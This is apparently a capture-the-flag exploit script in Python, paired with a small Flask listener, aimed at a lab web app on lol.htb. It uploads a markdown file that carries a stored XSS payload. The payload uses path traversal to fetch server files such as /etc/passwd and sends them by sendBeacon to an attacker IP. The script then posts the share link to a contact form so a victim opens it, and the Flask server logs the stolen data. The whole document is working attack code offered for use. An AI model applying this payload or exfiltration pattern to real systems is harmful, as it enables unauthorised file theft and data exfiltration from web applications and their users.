import requests
import os,sys,re

##
##

# Function to ensure the correct number of arguments
def check_arguments():
    if len(sys.argv) != 2:
        print("Usage:\npython3 exploit.py <file_path>")
        print("Example: python3 exploit.py /etc/passwd")
        sys.exit(1)

# Function to get the file path from arguments
def get_file_path():
    return sys.argv[1]

# Function to craft the XSS payload
def craft_xss_payload(file_path):
    return f"""
<script>
  fetch("http://lol.htb/message.php?file=../../../..{file_path}")
    .then(r => r.text())
    .then(t => navigator.sendBeacon("http://10.10.69.69/", t))
</script>
"""

# Function to send the XSS payload via POST request
def send_payload(xss_payload):
    try:
        response = requests.post(
            "http://lol.htb/yo.php", 
            files={"file": ("test.md", xss_payload, "text/markdown")}
        )
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error during POST request to yo.php: {e}")
        sys.exit(1)

# Function to extract the share link from the response
def extract_share_link(response):
    get_links = re.findall(r"http[s]?://\S+", response.text)
    if len(get_links) < 3:
        print("Error: Unable to extract the share link from the response.")
        sys.exit(1)
    return get_links[2][:-1]  # Remove the trailing character from the URL

# Function to send the share link to contact.php
def send_share_link(share_link):
    data = {
        "email": "test@alert.htb",
        "message": share_link
    }
    try:
        contact_response = requests.post("http://lol.htb/contact.php", data=data)
        contact_response.raise_for_status()
        print(f"Exploit successfully triggered. Share link sent: {share_link}")
    except requests.exceptions.RequestException as e:
        print(f"Error during POST request to contact.php: {e}")
        sys.exit(1)

# Main execution flow
def main():
    check_arguments()
    file_path = get_file_path()

    print(f"Requesting file: {file_path}")

    # Craft the XSS payload
    xss_payload = craft_xss_payload(file_path)
    print("XSS Payload sent successfully.")

    # Send the payload and get the response
    response = send_payload(xss_payload)

    # Extract the share link from the response
    share_link = extract_share_link(response)

    # Send the share link to the contact endpoint
    send_share_link(share_link)

if __name__ == "__main__":
    main()

##
##

from flask import Flask, request
import os

app = Flask(__name__)

# Define a route to receive file contents and print them
@app.route('/', methods=['POST'])
def handle_post():
    file_data = request.data.decode('utf-8')
    print(f"Received data: {file_data}")
    return "POST request received", 200

# Function to start the Flask server
def start_server():
    app.run(host='0.0.0.0', port=80)

if __name__ == "__main__":
    start_server()

##
##
